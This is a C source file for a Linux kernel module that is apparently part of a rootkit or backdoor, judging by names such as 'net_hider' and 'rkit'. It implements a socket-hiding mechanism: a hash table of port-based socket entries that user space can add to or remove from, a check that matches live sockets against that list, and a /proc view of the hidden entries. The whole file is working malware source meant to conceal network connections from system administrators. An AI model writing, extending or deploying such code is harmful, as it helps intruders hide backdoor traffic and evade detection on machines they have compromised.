#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/rhashtable.h>
#include <linux/tcp.h>
#include "bdoor_common.h"
#include "net_hider.h"
#include "util.h"

#ifdef CONFIG_X86_64

struct rhashtable_params socket_blacklist_params = {
        .key_len = sizeof(struct sock_id),
        .key_offset = offsetof(struct socket_blacklist_entry,id),
        .head_offset = offsetof(struct socket_blacklist_entry,node)
};

atomic_t socket_blacklist_users;
struct rhashtable socket_blacklist;
spinlock_t socket_blacklist_lock;

void socket_blacklist_free_entry(void *ptr, void *arg)
{
        struct socket_blacklist_entry *entry =
		(struct socket_blacklist_entry*)ptr;
        kfree(entry);
}

static void add_socket_to_blacklist(struct sock_id *id)
{
	int err;
	struct socket_blacklist_entry *new_entry =
		kmalloc(sizeof(struct socket_blacklist_entry),GFP_ATOMIC);
	memcpy(&new_entry->id,id,sizeof(struct sock_id));

	atomic_inc(&socket_blacklist_users);
	err = rhashtable_lookup_insert_fast(&socket_blacklist,
					&new_entry->node,
					socket_blacklist_params);

	if (err)
		kfree(new_entry);

	atomic_dec(&socket_blacklist_users);
}


static void rem_socket_from_blacklist(struct sock_id *id)
{
	struct socket_blacklist_entry *old_entry;

	atomic_inc(&socket_blacklist_users);
	old_entry = rhashtable_lookup_fast(&socket_blacklist,
					id,
					socket_blacklist_params);
	if (!old_entry)
		goto out;

	rhashtable_remove_fast(&socket_blacklist,
			&old_entry->node,
			socket_blacklist_params);
	kfree(old_entry);
out:
	atomic_dec(&socket_blacklist_users);
}

int process_sockadd_request(struct sock_request *request)
{
	int i;
	int ret = 0;
	struct sock_id *entries = kmalloc(request->count * sizeof(struct sock_id),GFP_ATOMIC);

	if (copy_from_user(entries,(struct sock_id*)request->socks,
				request->count * sizeof(struct sock_id))) {
		ret = 1;
		goto out;
	}

	for (i = 0; i < request->count; i++)
		add_socket_to_blacklist(&entries[i]);

out:
	kfree(entries);
	return ret;
}


int process_sockrem_request(struct sock_request *request)
{
        int i;
	int ret = 0;
	struct sock_id *entries = kmalloc(request->count * sizeof(struct sock_id),GFP_ATOMIC);

	if (copy_from_user(entries,(struct sock_id*)request->socks,
				request->count * sizeof(struct sock_id))) {
		ret = 1;
		goto out;
	}

	for (i = 0; i < request->count; i++)
		rem_socket_from_blacklist(&entries[i]);

out:
	kfree(entries);
	return ret;
}

void sock2id(struct inet_sock *is,
		struct sock_id *local_id,
		struct sock_id *source_id,
		struct sock_id *dest_id)
{
        local_id->port_no = is->inet_num;
	source_id->port_no = is->inet_sport;
	dest_id->port_no = is->inet_dport;
}


int check_socket_blacklist(struct inet_sock *is)
{
	int ret = 0;
	unsigned long flags;
	int cur_stype;
	struct sock_id local_id = {
		.type = LOCAL,
		.port_no = is->inet_num,
	};
	struct sock_id source_id = {
		.type = SOURCE,
		.port_no = is->inet_sport,
	};
	struct sock_id dest_id = {
		.type = DEST,
		.port_no = is->inet_dport,
	};
	for (cur_stype = 0; cur_stype <= SOCK_PACKET; cur_stype++) {
		if (!valid_sock_types[cur_stype])
			continue;

		local_id.stype = cur_stype;
		source_id.stype = cur_stype;
		dest_id.stype = cur_stype;

		spin_lock_irqsave(&socket_blacklist_lock,flags);
		atomic_inc(&socket_blacklist_users);
		if (rhashtable_lookup_fast(&socket_blacklist,&local_id,
						socket_blacklist_params))
			ret = 1;
		else if (rhashtable_lookup_fast(&socket_blacklist,&source_id,
							socket_blacklist_params))
			ret = 1;
		else if (rhashtable_lookup_fast(&socket_blacklist,&dest_id,
							socket_blacklist_params))
			ret = 1;
		atomic_dec(&socket_blacklist_users);
		spin_unlock_irqrestore(&socket_blacklist_lock,flags);

		if (ret)
			break;
	}
	return ret;
}

static int socket_blacklist_show(struct seq_file *p, void *v)
{
	struct rhashtable_iter iter;
        struct sock_id *cur_id;
        unsigned long flags;

	seq_printf(p,"%-*s%-*s%-*s\n",
                7,"TYPE",
		10,"STYPE",
                6,"PORTNO");
        spin_lock_irqsave(&socket_blacklist_lock,flags);
        atomic_inc(&socket_blacklist_users);
        rhashtable_walk_enter(&socket_blacklist,&iter);
        rhashtable_walk_start(&iter);

        while ((cur_id = rhashtable_walk_next(&iter)) != NULL) {
                rhashtable_walk_stop(&iter);
                seq_printf(p,"%-*s%-*s%-*hu\n",
			7,rkit_sock_type_names[cur_id->type],
			10,sock_type_names[cur_id->stype],
			6,cur_id->port_no);
                rhashtable_walk_start(&iter);
        }

        rhashtable_walk_stop(&iter);
        rhashtable_walk_exit(&iter);
        atomic_dec(&socket_blacklist_users);
        spin_unlock_irqrestore(&socket_blacklist_lock,flags);
	return 0;
}

static int socket_blacklist_open(struct inode *inode,struct file *file)
{
	return single_open(file,socket_blacklist_show,NULL);
}

const struct proc_ops socket_blacklist_ops = {
	.proc_open = socket_blacklist_open,
	.proc_read = seq_read,
	.proc_release = single_release,
};

struct proc_dir_entry *socket_blacklist_viewer;

#endif
